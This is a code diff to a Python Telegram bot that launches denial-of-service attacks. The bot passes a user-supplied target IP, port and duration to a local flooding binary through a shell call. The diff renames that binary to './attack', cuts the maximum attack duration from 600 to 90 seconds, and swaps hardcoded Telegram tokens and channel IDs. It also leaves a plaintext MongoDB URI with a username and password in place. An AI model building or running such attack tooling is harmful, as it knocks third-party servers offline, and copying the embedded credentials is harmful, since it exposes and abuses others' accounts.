@@ -18,11 +18,11 @@ import psutil
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '7592148523:AAE2CNyIxOX8HmijcKAeCj_ts7x1_n4NnAg'
+TOKEN = '7125146756:AAGEc1B72NAKRIGSSBGC6uSkuGpu-O4xx5Y'
 MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongodb.net/?retryWrites=true&w=majority&appName=SharpX'
-FORWARD_CHANNEL_ID = -1002444210076
-CHANNEL_ID = -1002444210076
-error_channel_id = -1002444210076
+FORWARD_CHANNEL_ID = -4579695188
+CHANNEL_ID = -4579695188
+error_channel_id = -4579695188
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -153,7 +153,7 @@ def extend_and_clean_expired_users():
 
 
 async def run_attack_command_async(chat_id, target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration}")
+    process = await asyncio.create_subprocess_shell(f"./attack {target_ip} {target_port} {duration}")
     await process.communicate()
     
     bot.attack_in_progress = False
@@ -365,8 +365,8 @@ def process_attack_command(message):
                                                "*Please select a different port to proceed.*", 
                                                reply_markup=create_inline_keyboard(), parse_mode='Markdown')
             return
-        if duration > 600:
-            bot.send_message(message.chat.id, "*⏳ Maximum duration is 600 seconds.*\n"
+        if duration > 90:
+            bot.send_message(message.chat.id, "*⏳ Maximum duration is 90 seconds.*\n"
                                                "*Please shorten the duration and try again!*", 
                                                reply_markup=create_inline_keyboard(), parse_mode='Markdown')
             return  
